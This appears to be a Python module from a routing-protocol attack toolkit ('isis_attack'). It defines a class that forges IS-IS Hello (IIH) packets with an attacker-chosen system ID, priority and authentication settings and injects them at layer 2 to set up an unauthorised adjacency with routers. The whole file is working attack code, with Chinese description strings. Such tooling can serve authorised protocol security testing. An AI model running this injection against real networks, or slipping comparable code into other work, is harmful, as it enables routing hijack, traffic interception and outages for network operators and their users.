from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import IIHConfig
from isis_attack.core.packet import build_iih_packet
from isis_attack.network.sender import PacketSender
from isis_attack.network.adapter import get_local_mac

_AUTH_MAP = {"none": 0, "plain": 1, "md5": 2}


class IIHInjectAttack(BaseAttack):
    name = "iih-inject"
    description = "注入伪造 IIH (IS-IS Hello) 建立未授权邻接关系"
    category = AttackCategory.ADJACENCY
    config: IIHConfig

    def setup(self) -> None:
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        auth_type = _AUTH_MAP.get(self.config.auth_type, 0)
        auth_key = self.config.auth_key.encode() if self.config.auth_key else b""
        pkt = build_iih_packet(
            sys_id=self.config.sys_id,
            area_addr=self.config.area_addr,
            src_mac=self._src_mac,
            level=self.config.level,
            priority=self.config.priority,
            hold_timer=self.config.hold_timer,
            hello_interval=self.config.hello_interval,
            auth_type=auth_type,
            auth_key=auth_key,
        )
        ok = self._sender.send_l2(pkt)
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"IIH 注入: System ID={self.config.sys_id}, Priority={self.config.priority}",
        )
